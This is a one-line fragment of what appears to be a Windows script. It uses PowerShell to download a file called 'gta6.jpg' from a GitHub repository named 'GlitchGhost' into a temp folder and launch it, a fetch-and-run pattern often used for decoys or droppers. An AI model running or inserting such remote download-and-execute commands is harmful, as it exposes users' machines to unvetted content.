...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Issac-dev/GlitchGhost/main/gta6.jpg' -OutFile '%tempPath%\gta6.jpg'; Start-Process '%tempPath%\gta6.jpg'"
